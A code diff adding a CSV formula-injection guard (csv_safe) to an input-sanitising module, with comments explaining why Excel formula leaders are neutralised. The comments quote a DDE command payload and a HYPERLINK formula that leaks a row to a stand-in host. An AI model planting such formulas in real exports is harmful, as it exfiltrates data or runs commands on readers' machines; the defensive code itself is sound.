@@ -12,6 +12,8 @@ and real set of problems:
   in a ``Content-Disposition`` header, is header and log injection.
 * **Filenames.** An uploaded name reaches a filesystem path and a download
   header, and neither should ever see ``../``.
+* **Spreadsheet formulas.** A field that starts with ``=`` is a formula to
+  Excel, not a trade name, and the CSV exports are opened in Excel by design.
 """
 from __future__ import annotations
 
@@ -91,6 +93,43 @@ def safe_filename(value: str | None, *, fallback: str = "upload", max_length: in
     cleaned = _FILENAME_SAFE.sub("_", strip_control_chars(leaf)).strip(" .")
     cleaned = _MULTI_DOT.sub(".", cleaned)
     return cleaned[:max_length] or fallback
+
+
+# The characters that make a spreadsheet treat a cell as something other than
+# text. ``=`` and ``+`` open a formula; ``-`` does too when what follows is not
+# a number; ``@`` is Excel's legacy call/intersection operator and is what makes
+# ``@SUM`` and the old ``=cmd|'/c calc'!A0`` DDE payload work. Tab and carriage
+# return are here because a leading one is stripped by some importers, which
+# hands the next character the start of the cell back.
+_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def csv_safe(value: str | None) -> str:
+    """Neutralise a text field so a spreadsheet shows it instead of running it.
+
+    The CSV exports exist to be opened in Excel — that is stated on the endpoint
+    — and Excel evaluates any cell beginning with ``=``, ``+``, ``-`` or ``@``.
+    A counterparty name is free text that arrives from an uploaded invoice or
+    from a PATCH, so ``=HYPERLINK("http://x/?"&A2,"Open")`` in a supplier's
+    trade name exfiltrates the row it lands next to as soon as a CA opens the
+    purchase register and clicks. Quoting does not help: the CSV quoting rules
+    are about the *file* being parsed correctly, and a correctly parsed cell
+    whose content is ``=...`` is still a formula.
+
+    Prefixed with an apostrophe rather than dropped or rejected. Losing a
+    character out of a name silently corrupts the register, and refusing the
+    export would punish the business for what a supplier put on an invoice; the
+    apostrophe is the marker spreadsheets already use for "this is text", and a
+    machine reading the CSV back gets a value that differs by one visible,
+    obvious character rather than one that has been quietly edited.
+
+    Only for text. Do not put a number through this — a credit note's ``-``
+    prefix is arithmetic, and the numeric columns are formatted by this
+    application rather than typed by anyone.
+    """
+    if not value:
+        return ""
+    return f"'{value}" if value.startswith(_FORMULA_LEADERS) else value
 
 
 def safe_extension(filename: str | None, *, max_length: int = 10) -> str:
